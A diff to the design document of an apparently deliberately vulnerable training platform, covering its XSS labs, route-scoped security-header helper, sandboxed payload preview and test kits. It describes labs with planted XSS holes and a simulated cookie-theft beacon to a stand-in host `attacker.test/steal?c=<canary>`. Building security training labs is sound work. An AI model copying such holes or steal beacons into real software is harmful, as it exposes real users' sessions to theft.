@@ -86,6 +86,15 @@ src/districts/index.ts              imports each district index
   - `curl.testkit.ts`: `describeCurlExample({ challenge, path, curl: (level) => ExpectedCurl })`, the front page's curl
     line at every level. `curl.spec.ts` tests the helpers and the partial.
   - `victim-lab.testkit.ts`: the victim-lab test kit (section 8, Testing).
+  - `xss-lab.ts` + `views/xss-proof.ejs`: what the server-sink XSS labs share (SC-01, SC-02, SC-04, FP-05; section 13):
+    `xssVictim(cookie, handler)` (in the `perSession` factory: a world, the player's marker, the admin's session key and
+    XSS browser, signed in), `rearmVictim(cookie, victimFor)` (the presets' `rearm`), `signOutPage(cookie)` (the
+    citadel's `/logout`), `keySignIn(req, challenge, typed, victim, who)` (the proof: the whole key below Divine shows
+    the flag) and `proofView(...)` for the partial (the marker in `<code data-marker>` and the sign-in form,
+    `intent=sign-in`), included with `<%- include('../../../_shared/views/xss-proof', { proof: proof }) %>`.
+  - `xss-lab.testkit.ts`: `describeXssLab({ challenge, path, victimOf, attack, preview, fragment, payloads,
+    divineSanitizes? })` (section 13, Testing), `xssExploit(path, attack)` (an exploit as the player plays it), and the
+    page readers `markerOn`, `stealsOn`, `stolenKey`, `previewSrcdoc`, `signIn`, `labPage`.
 - **The Relic Market shop shell** (`relic-market/_shared/`: money, cart, orders, intents, the shop page, its test kit)
   is section 10; its race and time primitives are sections 11 and 12.
 - **Shared pieces of the pilgrim labs** (sign in as `pilgrim`, take over the admin's data or page: GK-12 ... GK-18),
@@ -172,6 +181,7 @@ case (g)). Divine resists every exploit.
 | `newMarker()`, `xssBrowser(world, handler, { marker, canary, interact?, dom? })`, `XSS_STEAL_URL` | `core/xss` (`core/victim.ts`) | XSS labs: the player's marker call per player and level, and the admin's browser whose rendered pages run through the oracle; a payload that runs sends `GET http://attacker.test/steal?c=<canary>` to the attacker log (section 13) |
 | `previewFrame(fragment, { marker?, title?, hash? })` | `core/xss` | the vulnerable fragment, live for the player, inside `<iframe sandbox="allow-scripts" srcdoc>`; the only raw output of an XSS view (section 13) |
 | `xssOracle(html, marker, opts?)`, `linkSinks(html)`, `roundTrip(html)`, `XSS_LIMITS` | `core/xss` | the static oracle itself (sinks, marker, mXSS), the links and resources a mail would load, a sanitizer's fixed-point seam, the bounds (section 13) |
+| `setLabHeaders(res, { csp?, frameAncestors?, xfo?, cors? })`, `labHeaders(h)`, `LabHeaders` | `core/http` | a level's CSP / `X-Frame-Options` / `frame-ancestors` / CORS on its OWN route's response, from an allow-list; `labHeaders` is the same lines as a plain object, for a citadel twin's `SimResponse` (section 4, "Lab headers") |
 
 `req.level` on a challenge route is already clamped to the implemented levels;
 `req.sessionId` and `req.lang` are typed. `res.locals.challenge` and
@@ -361,6 +371,39 @@ says so, and the spec uses `malformed: []` plus an explicit "no database text at
   belongs in `model.ts`.
 - **Fixtures** (wordlists, leaked lists) live in `fixtures/`, are read once with `fixtureLines` and served with
   `sendLines`; the page links them by absolute path.
+
+**Lab headers (route-scoped, `core/http.ts`; owner decision Q4).** The platform sends no CSP, no `X-Frame-Options` and
+no CORS headers, and no lab changes that globally: a lab that needs them (an XSS Divine's CSP, the clickjacking and CORS
+labs' per-level framing and CORS answers) sets them on its OWN response with `setLabHeaders(res, h)`. Nothing else
+changes: not the lab's other routes, not another lab, not the portal, not the platform's own pages (`tests/http.spec.ts`).
+
+```ts
+// levels/divine.ts: the level decides, so View Source and the Diff show it
+export const headers: LabHeaders = { csp: "script-src 'self'; object-src 'none'; base-uri 'none'" };
+// challenge.ts (real route) and model.ts (citadel twin): one decision, both browsers
+setLabHeaders(res, impl.for(req.level).headers ?? {});
+return { status: 200, headers: labHeaders(impl.for(level).headers ?? {}), body };
+```
+
+- **The allow-list** is the whole interface: `csp` (one policy, no comma), `frameAncestors` (its source list, written as
+  that policy's own `frame-ancestors` directive), `xfo` (`'DENY'` or `'SAMEORIGIN'`), and `cors: { allowOrigin?,
+  allowCredentials?, varyOrigin? }` (`Access-Control-Allow-Origin` as the level decided it, a reflected or `null` origin
+  included; `Access-Control-Allow-Credentials: true` only for `true`; `Vary: Origin` added to any `Vary` already set).
+  Any other option, a value of the wrong type or with a control character, or `frame-ancestors` given twice throws: a
+  lab bug, a stack-free 500. `{}` sets nothing, so every level can export a value.
+- **It refuses** a response that is not a lab route (no `res.locals.labPath`), one whose headers are sent, and one that
+  already carries one of its headers (two decisions for one header are never merged or overwritten). A refused call sets
+  nothing.
+- **`labHeaders(h)`** is the same lines as a frozen plain object (wire names, `LAB_HEADER_NAMES`): put them in the
+  citadel twin's `SimResponse`, so the victim's browser gets what the player's does.
+- **A previewFrame inherits the page's CSP** (a srcdoc document takes its parent's policy). A `script-src` without
+  `'unsafe-inline'` therefore blocks the preview's banner shim and every inline payload in it, as a browser would. The
+  platform layout has no inline script or handler (htmx is a file under `/static/`), so `script-src 'self'` leaves the
+  lab bar and the victim panel working.
+- **The XSS oracle evaluates only CSP `sandbox`** (section 13). A policy is defence in depth: a Divine level encodes or
+  sanitizes, and its spec's mutation "encoding removed, CSP kept" must go red.
+- Header-shaped lessons whose bytes are not HTTP-header values (a `<meta>` CSP, a `<meta>` frame option) stay in the
+  level's markup; this helper writes response headers only.
 - **Limiters and lockouts must not be beaten by waiting.** A short window or a short lock turns a brute-force lab
   into "wait and retry" at every level, Divine included. Use long windows or locks (15 min or more) below Divine and
   an escalating per-account lockout at Divine (the fifth failure locks, every further one doubles it, capped), so
@@ -561,7 +604,9 @@ hand-written parser); the classifier is the ground truth for where the victim's 
 ### What is simulated
 
 - **`simWorld({ mailboxes })`**: one player's world at one level: `world.inbox`, `world.attackerLog`, the victim's recent
-  visits (`world.visits`) and a clock (`world.now`, a test seam like `state.now`).
+  visits (`world.visits`) and a clock (`world.now`, a test seam like `state.now`). **`world.visits` starts afresh with
+  every victim action** (the action's start clears it): it holds that action's visits, and any made after it, newest
+  `SIM_LIMITS.visits`. A spec that presses the button twice reads the visits after each press, not both at the end.
 - **`world.inbox`**: fixed mailboxes, `PLAYER_MAILBOX` (`pilgrim@citadel.test`) always plus the ones named (usually
   `ADMIN_MAILBOX`); mail to any other address bounces (`deliver()` returns `undefined`), so no map is keyed by attacker
   input. `deliver({ from, to, subject, body, links })`, `newest(address)`, `list(address)` (newest first). Links are an
@@ -633,7 +678,11 @@ the container has 512 MB:
 - At most `SIM_LIMITS.newWorldsPerMinute` (30) new instances a minute per holder, by default and as a ceiling: a lab may
   pass a lower `maxNewPerMinute`, never higher (asking for more fails at the first factory run).
 - Tests may shrink the budget with `setCappedBudget(bytes)` from `core/lab.ts` (restore the value it returns), and read
-  it with `cappedBudgetUsage()` (`{ bytes, instances, budget }`).
+  it with `cappedBudgetUsage()` (`{ bytes, instances, budget }`). **A spec that checks what one new instance adds to
+  the budget makes room first**: a busy spec file fills the shared budget, and the eviction the new instance causes
+  gives bytes back, so the difference comes out short. Raise the budget for the check and restore it in a `finally`:
+  `const prev = setCappedBudget(cappedBudgetUsage().bytes + 64 * 1024 * 1024); try { ... } finally { setCappedBudget(prev); }`
+  (SC-02, FP-05).
 
 Keep the world and the victim's browser in the lab's own per-session state, next to whatever else the lab tracks
 (accounts, tokens, codes), so one eviction or one `reset` drops all of it together:
@@ -1719,13 +1768,21 @@ Every string kept is a copy.
   (`default-src 'none'`), and a shim that turns `hvwa()` and `alert()` into a text banner naming the player's own
   marker. Checked in headless Chrome 157. A route-scoped CSP on the lab page applies inside it too, because srcdoc
   inherits it.
+- **`javascript:` links run in the preview through the shim.** A `sandbox="allow-scripts"` frame never runs a
+  `javascript:` URL a click navigates to (Chrome 157, with or without the meta CSP), so a link payload the oracle
+  counts would never be seen firing. The shim catches the click on an `a` or `area`, or on a submit button with a form
+  owner (its `formaction`, else the form's `action`), decodes the URL exactly as the oracle does (`urlText`,
+  `schemeOf`, `javascriptSource`: C0 controls and spaces trimmed, tabs and newlines removed, the scheme compared
+  case-insensitively, the rest percent-decoded as UTF-8; entities are undone by the parser), cancels the navigation and
+  runs the code as an inline script in the frame. The frame stays sandboxed with no `allow-same-origin`; a page CSP
+  without `'unsafe-inline'` blocks it, as it blocks every inline payload. `tests/xss-preview.spec.ts` checks the
+  decoding against the oracle's own functions.
 - `hvwa_sid` is HttpOnly and `SameSite=Lax`: no script anywhere reads the player's session.
 - Raw lab input reaches only the preview frame; everything else is escaped. Residual risk, accepted: all labs share
   the loopback origin, so a payload the player pastes into their own address bar or devtools can script their own
   platform page.
-- Route-scoped headers come from `setLabHeaders` in `core/http.ts`, which ships with the SC XSS batch (with `labHeaders(h)`
-  for the same headers in a `SimResponse`); until it is on master, a Divine level that adds CSP sets the header on its
-  own route only, never globally.
+- A Divine level that adds a CSP sets it on its own route with `setLabHeaders` (section 4, "Lab headers"), never
+  globally, and puts the same lines (`labHeaders`) in its citadel twin's answer.
 
 ### Testing
 
@@ -1733,13 +1790,17 @@ Every string kept is a copy.
   select pass, SMIL `href`, precision, form owners, `data:` images and tracks, XML documents and DTDs), escaped
   negatives, mXSS corpora, marker reachability,
   per-player isolation, the bounds (including the linear-time and mocked-clock cases), `linkSinks` and the preview's
-  attributes. It also guards imports: `core/xss/` imports
+  attributes (`tests/xss-preview.spec.ts`: its `javascript:` link runner). It also guards imports: `core/xss/` imports
   only parse5 and `sim/limits.ts` (the copying clip), with no dynamic `import()`, no network, file system, `vm`,
   `child_process` or code-loading global; parse5 and entities import no Node builtin at all; `core/sim/` never
   reaches `core/xss/`.
 - **The victim wrap (`tests/xss-victim.spec.ts`).** In process: what renders, what fires, the canary (read after the
   page's `Set-Cookie`), content types (XML read as XML), CSP sandbox, the `dom` twin, its hash and its failures, and
   the bound on kept verdicts.
+- **The XSS lab kit (`src/districts/_shared/xss-lab.testkit.ts`, section 1).** `describeXssLab` runs the cases below
+  that every server-sink XSS lab shares (the preview holds the fragment and runs it only isolated, one steal with no
+  Referer, Divine never fires, only the whole session key signs in, players and levels isolated); a lab spec adds its
+  own (re-arm, bounds, Restart, the Divine sanitizer on a corpus).
 - **A lab spec**, like XV-01, scripts the exploit as a player would. It reads the marker from the page (put it in
   `<code data-marker>`), sends the link (`POST <lab>/victim/send-link`), reads the canary from the attacker log
   (`attackerHits(html)`, the hit whose URL starts with `XSS_STEAL_URL`), then completes the attack.
@@ -1747,7 +1808,11 @@ Every string kept is a copy.
   - the preview's srcdoc ends with `<body>` + the level's fragment + `</body></html>`;
   - `xssOracle(labPage.text, marker)` finds the marker sinks only `isolated` (the payload never runs on the platform
     page);
-  - Divine's librarian saw the marker as text (`labFor(...).admin.verdicts`: `reachedMarker` true, `fired` false);
+  - Divine's admin never fired (`labFor(...).admin.verdicts`: `fired` false, no `limited`) and saw the marker as text
+    (`reachedMarker` true). **The "as text" half holds for an ESCAPING Divine only**: a sanitizing Divine drops the
+    marker together with the attribute or element it sat in, so there only some payloads reach the page as text;
+    `describeXssLab({ ..., divineSanitizes: true })` then asks for at least one (SC-02, FP-05, and SC-04, whose refused
+    link keeps only its label);
   - players and levels are isolated;
   - a logout link does not wedge the victim (re-arm);
   - for a level that serves player XML: Divine never produces `limited: 'dtd'` (it refuses a DOCTYPE with an
